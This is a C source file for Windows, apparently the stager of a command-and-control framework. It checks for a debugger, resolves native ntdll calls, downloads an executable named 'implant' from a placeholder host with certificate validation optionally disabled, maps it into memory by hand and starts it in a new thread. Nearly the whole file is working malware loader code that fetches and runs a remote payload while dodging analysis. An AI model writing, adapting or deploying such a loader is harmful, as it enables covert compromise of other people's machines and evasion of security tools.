#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winhttp.h>

#pragma comment(lib, "winhttp.lib")

typedef LONG NTSTATUS;
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)



typedef NTSTATUS(NTAPI *pNtAllocateVirtualMemory)(
    HANDLE ProcessHandle, PVOID *BaseAddress, ULONG_PTR ZeroBits,
    PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);

typedef NTSTATUS(NTAPI *pNtProtectVirtualMemory)(HANDLE ProcessHandle,
                                                 PVOID *BaseAddress,
                                                 PSIZE_T RegionSize,
                                                 ULONG NewProtect,
                                                 PULONG OldProtect);

typedef NTSTATUS(NTAPI *pNtCreateThreadEx)(
    PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, PVOID ObjectAttributes,
    HANDLE ProcessHandle, PVOID StartRoutine, PVOID Argument, ULONG CreateFlags,
    SIZE_T ZeroBits, SIZE_T StackSize, SIZE_T MaximumStackSize,
    PVOID AttributeList);

typedef NTSTATUS(NTAPI *pNtWaitForSingleObject)(HANDLE Handle,
                                                BOOLEAN Alertable,
                                                PLARGE_INTEGER Timeout);

static pNtAllocateVirtualMemory fnNtAllocateVirtualMemory;
static pNtProtectVirtualMemory fnNtProtectVirtualMemory;
static pNtCreateThreadEx fnNtCreateThreadEx;
static pNtWaitForSingleObject fnNtWaitForSingleObject;

static BOOL ResolveFuncs(void) {
  HMODULE ntdll = GetModuleHandleA("ntdll.dll");
  if (!ntdll)
    return FALSE;

  fnNtAllocateVirtualMemory = (pNtAllocateVirtualMemory)GetProcAddress(
      ntdll, "NtAllocateVirtualMemory");
  fnNtProtectVirtualMemory =
      (pNtProtectVirtualMemory)GetProcAddress(ntdll, "NtProtectVirtualMemory");
  fnNtCreateThreadEx =
      (pNtCreateThreadEx)GetProcAddress(ntdll, "NtCreateThreadEx");
  fnNtWaitForSingleObject =
      (pNtWaitForSingleObject)GetProcAddress(ntdll, "NtWaitForSingleObject");

  return fnNtAllocateVirtualMemory && fnNtProtectVirtualMemory &&
         fnNtCreateThreadEx && fnNtWaitForSingleObject;
}

static PBYTE Download(LPCWSTR host, USHORT port, LPCWSTR path, PDWORD outSize) {
  HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
  PBYTE buf = NULL;
  DWORD total = 0, cap = 0x100000;

  hSession =
      WinHttpOpen(NULL, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
  if (!hSession)
    goto cleanup;

  hConnect = WinHttpConnect(hSession, host, port, 0);
  if (!hConnect)
    goto cleanup;

#ifdef USE_TLS
  DWORD flags = WINHTTP_FLAG_SECURE;
#else
  DWORD flags = 0;
#endif

  hRequest =
      WinHttpOpenRequest(hConnect, L"GET", path, NULL, WINHTTP_NO_REFERER,
                         WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
  if (!hRequest)
    goto cleanup;

#ifdef USE_TLS
  // Ignore certificate validation errors for self-signed certs
  // WINHTTP_OPTION_SECURITY_FLAGS = 31
  // SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
  // SECURITY_FLAG_IGNORE_CERT_DATE_INVALID = 0x3100
  DWORD secFlags = 0x00003300;
  WinHttpSetOption(hRequest, 31, &secFlags, sizeof(secFlags));
#endif

  if (!WinHttpAddRequestHeaders(hRequest, L"X-Download-Key: DOWNLOAD_KEY_PLACEHOLDER\r\n", -1, WINHTTP_ADDREQ_FLAG_ADD))
    goto cleanup;

  if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                          WINHTTP_NO_REQUEST_DATA, 0, 0, 0))
    goto cleanup;
  if (!WinHttpReceiveResponse(hRequest, NULL))
    goto cleanup;

  SIZE_T regionSize = cap;
  PVOID baseAddr = NULL;
  if (!NT_SUCCESS(
          fnNtAllocateVirtualMemory((HANDLE)-1, &baseAddr, 0, &regionSize,
                                    MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)))
    goto cleanup;
  buf = (PBYTE)baseAddr;

  DWORD bytesRead;
  while (WinHttpReadData(hRequest, buf + total, cap - total, &bytesRead) &&
         bytesRead > 0) {
    total += bytesRead;
    if (total >= cap - 0x10000) {
      SIZE_T newSize = cap * 2;
      PVOID newBuf = NULL;
      if (!NT_SUCCESS(fnNtAllocateVirtualMemory(
              (HANDLE)-1, &newBuf, 0, &newSize, MEM_COMMIT | MEM_RESERVE,
              PAGE_READWRITE)))
        goto cleanup;
      CopyMemory(newBuf, buf, total);
      buf = (PBYTE)newBuf;
      cap = (DWORD)newSize;
    }
  }

  *outSize = total;

cleanup:
  if (hRequest)
    WinHttpCloseHandle(hRequest);
  if (hConnect)
    WinHttpCloseHandle(hConnect);
  if (hSession)
    WinHttpCloseHandle(hSession);
  return total > 0 ? buf : NULL;
}

static BOOL MapPE(PBYTE raw, DWORD rawSize, PVOID *outEntry) {
  PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)raw;
  if (dos->e_magic != IMAGE_DOS_SIGNATURE)
    return FALSE;

  PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(raw + dos->e_lfanew);
  if (nt->Signature != IMAGE_NT_SIGNATURE)
    return FALSE;

  SIZE_T imageSize = nt->OptionalHeader.SizeOfImage;
  PVOID baseAddr = NULL;

  if (!NT_SUCCESS(
          fnNtAllocateVirtualMemory((HANDLE)-1, &baseAddr, 0, &imageSize,
                                    MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)))
    return FALSE;

  PBYTE mapped = (PBYTE)baseAddr;
  CopyMemory(mapped, raw, nt->OptionalHeader.SizeOfHeaders);

  PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
  for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
    if (sec[i].SizeOfRawData > 0) {
      CopyMemory(mapped + sec[i].VirtualAddress, raw + sec[i].PointerToRawData,
                 sec[i].SizeOfRawData);
    }
  }

  LONGLONG delta = (LONGLONG)mapped - (LONGLONG)nt->OptionalHeader.ImageBase;
  if (delta != 0 &&
      nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size >
          0) {
    PIMAGE_BASE_RELOCATION reloc =
        (PIMAGE_BASE_RELOCATION)(mapped +
                                 nt->OptionalHeader
                                     .DataDirectory
                                         [IMAGE_DIRECTORY_ENTRY_BASERELOC]
                                     .VirtualAddress);
    while (reloc->VirtualAddress) {
      DWORD count =
          (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
      PWORD entries = (PWORD)((PBYTE)reloc + sizeof(IMAGE_BASE_RELOCATION));
      for (DWORD j = 0; j < count; j++) {
        WORD type = entries[j] >> 12;
        WORD offset = entries[j] & 0xFFF;
        if (type == IMAGE_REL_BASED_DIR64) {
          PULONGLONG patch =
              (PULONGLONG)(mapped + reloc->VirtualAddress + offset);
          *patch += delta;
        } else if (type == IMAGE_REL_BASED_HIGHLOW) {
          PULONG patch = (PULONG)(mapped + reloc->VirtualAddress + offset);
          *patch += (ULONG)delta;
        }
      }
      reloc = (PIMAGE_BASE_RELOCATION)((PBYTE)reloc + reloc->SizeOfBlock);
    }
  }

  if (nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size > 0) {
    PIMAGE_IMPORT_DESCRIPTOR imp =
        (PIMAGE_IMPORT_DESCRIPTOR)(mapped +
                                   nt->OptionalHeader
                                       .DataDirectory
                                           [IMAGE_DIRECTORY_ENTRY_IMPORT]
                                       .VirtualAddress);
    while (imp->Name) {
      HMODULE mod = LoadLibraryA((LPCSTR)(mapped + imp->Name));
      if (mod) {
        PULONGLONG thunk = (PULONGLONG)(mapped + imp->FirstThunk);
        PULONGLONG origThunk =
            imp->OriginalFirstThunk
                ? (PULONGLONG)(mapped + imp->OriginalFirstThunk)
                : thunk;
        while (*origThunk) {
          if (*origThunk & IMAGE_ORDINAL_FLAG64) {
            *thunk =
                (ULONGLONG)GetProcAddress(mod, (LPCSTR)(*origThunk & 0xFFFF));
          } else {
            PIMAGE_IMPORT_BY_NAME name =
                (PIMAGE_IMPORT_BY_NAME)(mapped + *origThunk);
            *thunk = (ULONGLONG)GetProcAddress(mod, name->Name);
          }
          thunk++;
          origThunk++;
        }
      }
      imp++;
    }
  }

  for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
    DWORD prot = PAGE_READONLY;
    DWORD chr = sec[i].Characteristics;
    if (chr & IMAGE_SCN_MEM_EXECUTE) {
      prot = (chr & IMAGE_SCN_MEM_WRITE) ? PAGE_EXECUTE_READWRITE
                                         : PAGE_EXECUTE_READ;
    } else if (chr & IMAGE_SCN_MEM_WRITE) {
      prot = PAGE_READWRITE;
    }

    PVOID secBase = mapped + sec[i].VirtualAddress;
    SIZE_T secSize = sec[i].Misc.VirtualSize;
    if (secSize == 0)
      secSize = sec[i].SizeOfRawData;
    ULONG oldProt;
    fnNtProtectVirtualMemory((HANDLE)-1, &secBase, &secSize, prot, &oldProt);
  }

  *outEntry = mapped + nt->OptionalHeader.AddressOfEntryPoint;
  return TRUE;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
                   LPSTR lpCmdLine, int nCmdShow) {
  if (IsDebuggerPresent())
    return 0;

  if (!ResolveFuncs())
    return 1;

  DWORD size = 0;
  PBYTE pe =
      Download(L"HOST_PLACEHOLDER", PORT_PLACEHOLDER, L"/implant", &size);
  if (!pe || size < 0x100)
    return 1;

  PVOID entry = NULL;
  if (!MapPE(pe, size, &entry))
    return 1;

  HANDLE hThread = NULL;
  if (!NT_SUCCESS(fnNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL,
                                     (HANDLE)-1, entry, NULL, 0, 0, 0, 0,
                                     NULL)))
    return 1;

  fnNtWaitForSingleObject(hThread, FALSE, NULL);
  return 0;
}
